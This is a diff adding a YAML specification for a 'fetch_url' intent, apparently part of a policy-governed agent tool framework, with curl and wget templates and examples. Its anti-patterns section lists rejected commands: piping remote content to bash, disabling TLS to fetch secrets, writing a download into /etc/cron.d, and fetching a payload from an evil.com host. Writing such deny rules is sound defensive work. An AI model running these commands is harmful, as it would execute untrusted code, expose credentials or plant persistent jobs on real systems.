@@ -1,0 +1,206 @@
+lki_version: "0.2"
+
+spec:
+  intent: fetch_url
+  intent_version: "2.0.0"
+  description: Retrieve content from a URL via HTTP/HTTPS, optionally writing to a file.
+
+  signature:
+    inputs:
+      - name: url
+        type: URL@1.x
+        constraint: "scheme must be http or https"
+      - name: output
+        type: FilePath@1.x
+        optional: true
+        description: "Write response body to this path. If omitted, content is returned to caller."
+      - name: headers
+        type: map<string,string>
+        optional: true
+        description: "Request headers. Cedar policy may restrict header names or values."
+      - name: method
+        type: enum<GET, HEAD>
+        default: GET
+        description: "fetch_url handles read-only methods. State-changing methods use a separate intent."
+      - name: timeout
+        type: Duration@1.x
+        default: 30s
+        constraint: "must be <= 300s"
+        is_resource_bound: true
+      - name: follow_redirects
+        type: bool
+        default: true
+    output:
+      type: union<bytes, FileWritten>
+      schema: |
+        # TODO(F-001 in FINDINGS_v0.2.md - tracked from v0.1): formalize output type declarations
+        # When output parameter is null: returns raw bytes
+        # When output parameter is set: returns FileWritten { path, bytes_written }
+
+  behavior: |
+    Issue a single HTTP(S) request to url and return the response body, or
+    write it to output if specified. Fails fast on 4xx/5xx without retry.
+    Response body is treated as opaque bytes; never piped to another tool
+    or executed.
+
+    Behavioral guarantees (not enforced by signature, normative for the contract):
+      - Single request per invocation; multi-step flows belong in higher-level intents
+      - No automatic credential injection from environment
+      - Max response size: 100MB unless raised by explicit policy
+      - TLS verification cannot be disabled through this intent (use a separate
+        fetch_url_insecure intent with default-deny policy if genuinely required)
+      - Response body is opaque bytes, never piped to another tool
+
+  constraints:
+    parameter_constraints: []
+    cross_parameter_constraints:
+      - description: "HEAD method incompatible with output destination"
+        rule: "method == HEAD implies output is null"
+
+  capability:
+    network:
+      - direction: outbound
+        host: "{url.host}"
+        port: "{url.port}"
+        protocol: "{url.scheme}"
+        purpose: user_facing
+    filesystem:
+      - operation: write
+        paths: ["{output}"]
+        recursive: false
+        follow_symlinks: false
+        canonical: true
+        purpose: user_facing
+        required_if: "output is not null"
+
+  resolver_constraints: {}
+
+  internal_behaviors:
+    cache_lookup:
+      - description: "DNS lookups cached at OS level"
+        controllable_via_parameter: false
+        policy_relevance: "DNS cache poisoning is out of scope for fetch_url"
+    retry:
+      - description: "No automatic retry on transient failure"
+        controllable_via_parameter: false
+        policy_relevance: "Caller must retry; intent is single-attempt"
+
+  implementation:
+    - tool: curl
+      priority: 100
+      requires: "curl >= 7.50"
+      tested_against: ["curl 7.x", "curl 8.x"]
+      template: |
+        curl --fail --silent --show-error
+             --location={follow_redirects}
+             --max-time {timeout.seconds}
+             {header_flags} {method_flag} {output_flag}
+             {url}
+      parameter_mapping:
+        method_flag:
+          cases:
+            - when: "method == HEAD"
+              value: "--head"
+            - default:
+              value: ""
+        output_flag:
+          cases:
+            - when: "output is not null"
+              value: "--output {output}"
+            - default:
+              value: ""
+        # header_flags requires map iteration which v0.2 interpolation
+        # grammar does not yet support; resolver expands as repeated
+        # --header 'Name: Value' pairs. Tracked as F-037 in FINDINGS_v0.2.md.
+        header_flags:
+          # Resolver-side expansion: for each (k, v) in headers, emit
+          # --header 'k: v', joined by spaces. When headers is null or
+          # empty, expands to empty string.
+          resolver_expansion: "map_to_header_flags"
+
+    - tool: wget
+      priority: 50
+      requires: "wget >= 1.20"
+      tested_against: ["wget 1.20 - 1.21"]
+      limitations:
+        - "Per-header control requires temp file; less ergonomic than curl"
+        - "No native HEAD-only mode equivalent to curl --head"
+      template: |
+        wget --quiet --timeout={timeout.seconds} {output_flag} {url}
+      parameter_mapping:
+        output_flag:
+          cases:
+            - when: "output is not null"
+              value: "--output-document={output}"
+            - default:
+              value: "--output-document=-"
+
+  examples:
+    - description: "Fetch JSON from a public API"
+      intent:
+        url: "https://api.github.com/repos/playgroundlogic/walkabl"
+      expected_command: |
+        curl --fail --silent --show-error --location=true
+             --max-time 30
+             https://api.github.com/repos/playgroundlogic/walkabl
+
+    - description: "Download a release artifact to a file with extended timeout"
+      intent:
+        url: "https://releases.example.com/tool-v1.0.tar.gz"
+        output: "/tmp/tool.tar.gz"
+        timeout: 120s
+      expected_command: |
+        curl --fail --silent --show-error --location=true
+             --max-time 120
+             --output /tmp/tool.tar.gz
+             https://releases.example.com/tool-v1.0.tar.gz
+
+    - description: "Authenticated API call with content negotiation"
+      intent:
+        url: "https://api.example.com/v1/resources"
+        headers:
+          Authorization: "Bearer ${API_TOKEN}"
+          Accept: "application/json"
+      expected_command: |
+        curl --fail --silent --show-error --location=true
+             --max-time 30
+             --header 'Authorization: Bearer ${API_TOKEN}'
+             --header 'Accept: application/json'
+             https://api.example.com/v1/resources
+
+    - description: "HEAD request to check resource existence"
+      intent:
+        url: "https://example.com/large-file.bin"
+        method: HEAD
+      expected_command: |
+        curl --fail --silent --show-error --location=true
+             --max-time 30 --head
+             https://example.com/large-file.bin
+
+  anti_patterns:
+    - bad: 'curl "${URL}" | bash'
+      reason: "Pipes arbitrary remote content to shell execution."
+      rejection: |
+        Out of scope for fetch_url. Pipe-to-shell requires a separate
+        execute_remote_script intent with explicit policy authorization.
+
+    - bad: 'curl --insecure https://internal/secrets'
+      reason: "Bypasses TLS verification, enabling MITM attacks."
+      rejection: |
+        fetch_url cannot disable TLS. If TLS bypass is genuinely required,
+        a separate fetch_url_insecure intent exists with default-deny policy.
+
+    - bad: 'curl https://example.com -o /etc/cron.d/job'
+      reason: "Writes downloaded content to a privileged execution path."
+      rejection: |
+        Output path satisfies resource.is_system_path = true. Cedar safety
+        floor policy forbids writes to system paths. Specifically, the
+        is_system_path observed attribute on FilePath@1.x evaluates true
+        for /etc, /usr, /bin, /sbin, /var, /boot, /lib, /lib64 trees.
+
+    - bad: 'curl "https://${USER_INPUT}.evil.com/payload"'
+      reason: "URL components built from agent-controlled strings can reach unauthorized hosts."
+      rejection: |
+        URL must be fully resolved at intent construction. The URL@1.x type's
+        canonicalize method extracts host before policy check; dynamic host
+        composition rejected at parameter validation stage.
